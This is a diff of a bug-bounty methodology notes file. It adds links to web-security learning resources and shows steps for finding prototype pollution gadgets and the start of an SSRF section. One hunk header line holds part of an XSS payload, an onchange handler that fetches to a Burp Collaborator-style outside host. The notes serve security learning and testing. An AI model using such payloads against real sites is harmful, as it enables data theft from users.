@@ -1,3 +1,6 @@
+Helpful resources
+ - https://gowthams.gitbook.io/bughunter-handbook/
+ - https://portswigger.net/web-security/dashboard
 # METHODOLOGY
 1. Look at the available scopes
 2. Run Ultimate.sh on it
@@ -283,6 +286,7 @@ onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.bur
     15. Expand the stack trace and use the provided link to jump to the line of code where the property is being read.
     16. Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as innerHTML or eval().
     17. Repeat this process for any properties that you think are potential gadgets.
+  - https://gowthams.gitbook.io/bughunter-handbook/list-of-vulnerabilities-bugs/prototype-pollution
 ### SSRF
  - places to look for
    - When a full URL is used in a parameter in the address bar:
